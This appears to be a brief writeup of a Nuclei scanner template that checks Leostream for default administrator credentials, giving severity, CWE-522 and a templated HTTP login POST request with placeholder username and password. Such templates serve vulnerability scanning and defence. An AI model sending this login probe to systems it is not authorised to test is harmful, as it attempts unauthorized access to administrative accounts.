# Nuclei Template: Leostream Default Login
**Template ID:** leostream-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`leostream-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Leostream default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}

login_type=0&user={{username}}&password={{password}}&submit=SIGN+IN
```

